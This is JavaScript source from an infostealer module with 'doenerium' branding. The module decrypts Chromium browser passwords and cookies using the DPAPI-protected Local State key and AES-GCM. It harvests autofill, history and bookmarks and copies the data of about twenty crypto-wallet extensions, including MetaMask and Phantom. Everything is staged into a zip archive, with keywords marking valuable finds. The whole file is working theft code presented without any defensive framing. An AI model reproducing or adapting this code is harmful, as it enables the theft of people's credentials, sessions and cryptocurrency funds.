module.exports = (client) => {
  return {
    async saveBrowserStuff() {
      ["passwords", "cookies", "bookmarks", "history", "autofill"].forEach(
        async (type) => {
          var _type = type.charAt(0).toUpperCase() + type.slice(1) // Capitalized
          client.utils.jszip.createFolder(`\\${_type}`);

          for (let [key, value] of Object.entries(
            client.config.environ[type]
          )) {
            if (value.length != 0) {
              var text = value.join("\n\n");
              var found_keywords = [];

              client.config.keywords.keywords.forEach((keyword) => {
                if (text.includes(keyword)) {
                  found_keywords.push(keyword);
                }
              });

              if (found_keywords.length == 0) {
                found_keywords =
                  "Found keywords: None\n<================[t.me/doenerium]>================>\n";
              } else {
                found_keywords = `Found keywords: ${found_keywords.join(
                  ", "
                )}\n<================[t.me/doenerium]>================>\n`;
              }

              client.utils.jszip.createTxt(
                `\\${_type}\\${key.toUpperCase()}.txt`,
                `${found_keywords}\n${text}`
              );
            }
          }
        }
      );
    },

    async getBookmarks(path) {
      let browser;

      if (path.includes("Local")) {
        browser = path.split("\\Local\\")[1].split("\\")[0];
      } else {
        browser = path.split("\\Roaming\\")[1].split("\\")[1];
      }

      if (browser == "Google") {
        browser == "Chrome";
      } else if (browser == "BraveSoftware") {
        browser = "Brave";
      } else if (browser == "Microsoft") {
        browser = "Microsoft Edge";
      }

      if (client.requires.fs.existsSync(`${path}\\Bookmarks`)) {
        var bookmarks = JSON.parse(
          client.requires.fs.readFileSync(`${path}\\Bookmarks`)
        ).roots.bookmark_bar.children;

        for (var bookmark of bookmarks) {
          try {
            client.config.environ.bookmarks.all.push(
              `==================================================\nBROWSER   : ${browser}\nID        : ${bookmark["id"]}\nNAME      : ${bookmark["name"]}\nURL       : ${bookmark["url"]}\nGUID      : ${bookmark["guid"]}\nADDED AT  : ${bookmark["date_added"]}\n==================================================`
            );

            if (!client.config.environ.bookmarks[browser]) {
              client.config.environ.bookmarks[browser] = [];
            }

            client.config.environ.bookmarks[browser].push(
              `==================================================\nBROWSER   : ${browser}\nID        : ${bookmark["id"]}\nNAME      : ${bookmark["name"]}\nURL       : ${bookmark["url"]}\nGUID      : ${bookmark["guid"]}\nADDED AT  : ${bookmark["date_added"]}\n==================================================`
            );
          } catch (err) {}

          client.config.counter.bookmarks++;
        }
      }
    },

    async getAutofill(path) {
      let path_split = path.split("\\"),
        path_split_tail = path.includes("Network")
          ? path_split.splice(0, path_split.length - 3)
          : path_split.splice(0, path_split.length - 2),
        path_tail = path_split_tail.join("\\");

      let browser;

      if (path.includes("Local")) {
        browser = path.split("\\Local\\")[1].split("\\")[0];
      } else {
        browser = path.split("\\Roaming\\")[1].split("\\")[1];
      }

      if (browser == "Google") {
        browser == "Chrome";
      } else if (browser == "BraveSoftware") {
        browser = "Brave";
      } else if (browser == "Microsoft") {
        browser = "Microsoft Edge";
      }

      if (
        path.startsWith(
          client.utils.encryption.decryptData(client.config.user.appdata)
        )
      )
        path_tail = path;
      if (path.includes("cord")) {
        return;
      }

      if (client.requires.fs.existsSync(`${path}\\Web Data`)) {
        var sql = new client.requires.sqlite3.Database(
          `${path}\\Web Data`,
          (err) => {}
        );

        sql.each("SELECT * FROM autofill", function (err, row) {
          if (row) {
            client.config.environ.autofill.all.push(
              `Name: ${row.name} | Value: ${row.value} | Date created (timestamp): ${row.date_created} | Date last used (timestamp): ${row.date_last_used} | Count: ${row.count}`
            );

            if (!client.config.environ.autofill[browser]) {
              client.config.environ.autofill[browser] = [];
            }

            client.config.environ.autofill[browser].push(
              `Name: ${row.name} | Value: ${row.value} | Date created (timestamp): ${row.date_created} | Date last used (timestamp): ${row.date_last_used} | Count: ${row.count}`
            );
          }
        });
      }
    },

    async getHistory(path) {
      let path_split = path.split("\\"),
        path_split_tail = path.includes("Network")
          ? path_split.splice(0, path_split.length - 3)
          : path_split.splice(0, path_split.length - 2),
        path_tail = path_split_tail.join("\\");

      let browser;

      if (path.includes("Local")) {
        browser = path.split("\\Local\\")[1].split("\\")[0];
      } else {
        browser = path.split("\\Roaming\\")[1].split("\\")[1];
      }

      if (browser == "Google") {
        browser == "Chrome";
      } else if (browser == "BraveSoftware") {
        browser = "Brave";
      } else if (browser == "Microsoft") {
        browser = "Microsoft Edge";
      }

      if (
        path.startsWith(
          client.utils.encryption.decryptData(client.config.user.appdata)
        )
      )
        path_tail = path;
      if (path.includes("cord")) {
        return;
      }

      if (client.requires.fs.existsSync(`${path_tail}\\History`)) {
        var sql = new client.requires.sqlite3.Database(
          `${path}\\History`,
          (err) => {}
        );

        sql.each("SELECT * FROM urls", function (err, row) {
          try {
            client.config.environ.history.all.push(
              `ID: ${row.id} | URL: ${row.url} | Title: ${row.title} | Visit count: ${row.visit_count} | Last visit time (timestamp): ${row.last_visit_time} | Display count: ${row.display_count}`
            );

            if (!client.config.environ.history[browser]) {
              client.config.environ.history[browser] = [];
            }

            client.config.environ.history[browser].push(
              `ID: ${row.id} | URL: ${row.url} | Title: ${row.title} | Visit count: ${row.visit_count} | Last visit time (timestamp): ${row.last_visit_time} | Display count: ${row.display_count}`
            );
          } catch {}
        });
      }
    },

    async getCookies(path) {
      let path_split = path.split("\\"),
        path_split_tail = path.includes("Network")
          ? path_split.splice(0, path_split.length - 3)
          : path_split.splice(0, path_split.length - 2),
        path_tail = path_split_tail.join("\\") + "\\";

      let browser;

      if (path.includes("Local")) {
        browser = path.split("\\Local\\")[1].split("\\")[0];
      } else {
        browser = path.split("\\Roaming\\")[1].split("\\")[1];
      }

      if (browser == "Google") {
        browser == "Chrome";
      } else if (browser == "BraveSoftware") {
        browser = "Brave";
      } else if (browser == "Microsoft") {
        browser = "Microsoft Edge";
      }

      if (
        path.startsWith(
          client.utils.encryption.decryptData(client.config.user.appdata)
        )
      )
        path_tail = path;
      if (path.includes("cord")) {
        return;
      }

      if (client.requires.fs.existsSync(path_tail)) {
        let encrypted = Buffer.from(
          JSON.parse(client.requires.fs.readFileSync(path_tail + "Local State"))
            .os_crypt.encrypted_key,
          "base64"
        ).slice(5);

        if (!client.requires.fs.existsSync(path + "Network")) {
          return;
        } else {
        }

        const key = client.requires.dpapi.unprotectData(
          Buffer.from(encrypted, "utf-8"),
          null,
          "CurrentUser"
        );

        var sql = new client.requires.sqlite3.Database(
          `${path}Network\\Cookies`,
          (err) => {}
        );

        await new Promise((resolve, reject) => {
          var added_host_keys = {
            all: [],
          };

          sql.each(
            "SELECT * FROM cookies",
            function (err, row) {
              let encrypted_value = row["encrypted_value"];

              var decrypted;

              try {
                if (
                  encrypted_value[0] == 1 &&
                  encrypted_value[1] == 0 &&
                  encrypted_value[2] == 0 &&
                  encrypted_value[3] == 0
                ) {
                  decrypted = dpapi.unprotectData(
                    encrypted_value,
                    null,
                    "CurrentUser"
                  );
                } else {
                  let start = encrypted_value.slice(3, 15),
                    middle = encrypted_value.slice(
                      15,
                      encrypted_value.length - 16
                    ),
                    end = encrypted_value.slice(
                      encrypted_value.length - 16,
                      encrypted_value.length
                    ),
                    decipher = client.requires.crypto.createDecipheriv(
                      "aes-256-gcm",
                      key,
                      start
                    );
                  decipher.setAuthTag(end);
                  decrypted =
                    decipher.update(middle, "base64", "utf-8") +
                    decipher.final("utf-8");
                }
              } catch {}

              client.config.environ.cookies.all.push(
                `${row["host_key"]}  TRUE	/	FALSE	2597573456	${row["name"]}	${decrypted}`
              );

              if (!client.config.environ.cookies[browser]) {
                client.config.environ.cookies[browser] = [];
              }

              client.config.environ.cookies[browser].push(
                `${row["host_key"]}	TRUE	/	FALSE	2597573456	${row["name"]}	${decrypted}`
              );

              client.config.counter.cookies++;

              added_host_keys[browser] = [];
              added_host_keys["all"].push(row["host_key"]);
            },
            function () {
              resolve("");
            }
          );
        });
      }
    },

    async getWallets(path) {
      let path_split = path.split("\\"),
        path_split_tail = path.includes("Network")
          ? path_split.splice(0, path_split.length - 3)
          : path_split.splice(0, path_split.length - 2),
        path_tail = path_split_tail.join("\\") + "\\";

      let browser;

      if (path.includes("Local")) {
        browser = path.split("\\Local\\")[1].split("\\")[0];
      } else {
        browser = path.split("\\Roaming\\")[1].split("\\")[1];
      }

      if (browser == "Google") {
        browser == "Chrome";
      } else if (browser == "BraveSoftware") {
        browser = "Brave";
      } else if (browser == "Microsoft") {
        browser = "Microsoft Edge";
      }

      var extension_identifiers = {
        MetaMask: "nkbihfbeogaeaoehlefnkodbefgpgknn",
        Binance: "fhbohimaelbohpjbbldcngcnapndodjp",
        Phantom: "bfnaelmomeimhlpmgjnjophhpkkoljpa",
        Coinbase: "hnfanknocfeofbddgcijnmhnfnkdnaad",
        Ronin: "fnjhmkhhmkbjkkabndcnnogagogbneec",
        Exodus: "aholpfdialjgjfhomihkjbmgjidlcdno",
        Coin98: "aeachknmefphepccionboohckonoeemg",
        KardiaChain: "pdadjkfkgcafgbceimcpbkalnfnepbnk",
        TerraStation: "aiifbnbfobpmeekipheeijimdpnlpgpp",
        Wombat: "amkmjjmmflddogmhpjloimipbofnfjih",
        Harmony: "fnnegphlobjdpkhecapkijjdkgcjhkib",
        Nami: "lpfcbjknijpeeillifnkikgncikgfhdo",
        MartianAptos: "efbglgofoippbgcjepnhiblaibcnclgk",
        Braavos: "jnlgamecbpmbajjfhmmmlhejkemejdma",
        XDEFI: "hmeobnfnfcmdkdcmlblgagmfpfboieaf",
        Yoroi: "ffnbelfdoeiohenkjibnmadjiehjhajb",
        TON: "nphplpgoakhhjchkkhmiggakijnkhfnd",
        Authenticator: "bhghoamapcdpbohphigoooaddinpkbai",
        MetaMask_Edge: "ejbalbakoplchlghecdalmeeeajnimhm",
        Tron: "ibnejdfjmmkpcnlpebklmnkoeoihofec",
      };

      for (let [key, value] of Object.entries(extension_identifiers)) {
        if (
          client.requires.fs.existsSync(
            `${path}\\Local Extension Settings\\${value}`
          )
        ) {
          client.utils.jszip.copyFolder(
            `\\Wallets\\${browser} ${key}`,
            `${path}\\Local Extension Settings\\${value}`
          );
          client.config.counter.wallets++;
        }
      }
    },

    async getPasswords(path) {
      let path_split = path.split("\\"),
        path_split_tail = path.includes("Network")
          ? path_split.splice(0, path_split.length - 3)
          : path_split.splice(0, path_split.length - 2),
        path_tail = path_split_tail.join("\\") + "\\";

      let browser;

      if (path.includes("Local")) {
        browser = path.split("\\Local\\")[1].split("\\")[0];
      } else {
        browser = path.split("\\Roaming\\")[1].split("\\")[1];
      }

      if (browser == "Google") {
        browser == "Chrome";
      } else if (browser == "BraveSoftware") {
        browser = "Brave";
      } else if (browser == "Microsoft") {
        browser = "Microsoft Edge";
      }

      if (
        path.startsWith(
          client.utils.encryption.decryptData(client.config.user.appdata)
        )
      )
        path_tail = path;
      if (path.includes("cord")) {
        return;
      }

      if (client.requires.fs.existsSync(path_tail)) {
        let encrypted = Buffer.from(
          JSON.parse(client.requires.fs.readFileSync(path_tail + "Local State"))
            .os_crypt.encrypted_key,
          "base64"
        ).slice(5);

        var login_data = path + "Login Data",
          passwords_db = path + "passwords.db";

        client.requires.fs.copyFileSync(login_data, passwords_db);
        const key = client.requires.dpapi.unprotectData(
          Buffer.from(encrypted, "utf-8"),
          null,
          "CurrentUser"
        );
        var sql = new client.requires.sqlite3.Database(
          passwords_db,
          (err) => {}
        );

        await new Promise((resolve, reject) => {
          sql.each(
            "SELECT origin_url, username_value, password_value FROM logins",
            function (err, row) {
              if (row["username_value"] != "") {
                let password_value = row["password_value"];
                try {
                  var password;
                  if (
                    password_value[0] == 1 &&
                    password_value[1] == 0 &&
                    password_value[2] == 0 &&
                    password_value[3] == 0
                  ) {
                    password = dpapi.unprotectData(
                      password_value,
                      null,
                      "CurrentUser"
                    );
                  } else {
                    let start = password_value.slice(3, 15),
                      middle = password_value.slice(
                        15,
                        password_value.length - 16
                      ),
                      end = password_value.slice(
                        password_value.length - 16,
                        password_value.length
                      ),
                      decipher = client.requires.crypto.createDecipheriv(
                        "aes-256-gcm",
                        key,
                        start
                      );
                    decipher.setAuthTag(end);
                    password =
                      decipher.update(middle, "base64", "utf-8") +
                      decipher.final("utf-8");
                  }

                  client.config.environ.passwords.all.push(
                    `==================================================\nURL          : ${row["origin_url"]}\nWeb Browser  : ${browser}\nUser Name    : ${row["username_value"]}\nPassword     : ${password}\nFilename     : ${path}\n==================================================`
                  );

                  if (!client.config.environ.passwords[browser]) {
                    client.config.environ.passwords[browser] = [];
                  }
                  client.config.environ.passwords[browser].push(
                    `==================================================\nURL          : ${row["origin_url"]}\nWeb Browser  : ${browser}\nUser Name    : ${row["username_value"]}\nPassword     : ${password}\nFilename     : ${path}\n==================================================`
                  );

                  client.config.counter.passwords++;
                } catch {}
              }
            },
            function () {
              resolve("");
            }
          );
        });
      }
    },
  };
};
